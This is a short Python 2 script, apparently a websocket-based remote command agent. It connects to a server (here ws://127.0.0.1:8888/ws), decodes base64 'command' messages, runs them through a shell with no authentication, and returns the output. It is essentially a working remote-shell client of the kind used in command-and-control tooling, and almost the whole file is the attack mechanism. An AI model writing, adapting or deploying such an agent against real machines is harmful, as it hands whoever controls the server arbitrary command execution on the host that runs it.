import websocket
import json
import base64
import subprocess
import os

try:
    import thread
except ImportError:
    import _thread as thread
import time

def on_message(ws, message):
    print(message)
    msg = json.loads(message)
    if msg["type"] == "ping":
        ws.send(json.dumps({"type": "pong" }))

    if msg["type"] == "command":
        cmd = base64.b64decode(msg["value"])
        if cmd.lower().startswith("cd "):
            d = cmd.split(" ")[1]
            os.chdir(d)
            out = "OK"
            err = ""
        else:
            p = subprocess.Popen(cmd, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True)
            out, err = p.communicate()

        ws.send(json.dumps({"type": "response", "value": base64.b64encode(out+err)}))

def on_error(ws, error):
    print(error)

def on_close(ws):
    print("### closed ###")

def on_open(ws):
    print "Running"


if __name__ == "__main__":
#    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://127.0.0.1:8888/ws",
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close)
    ws.on_open = on_open
    ws.run_forever()
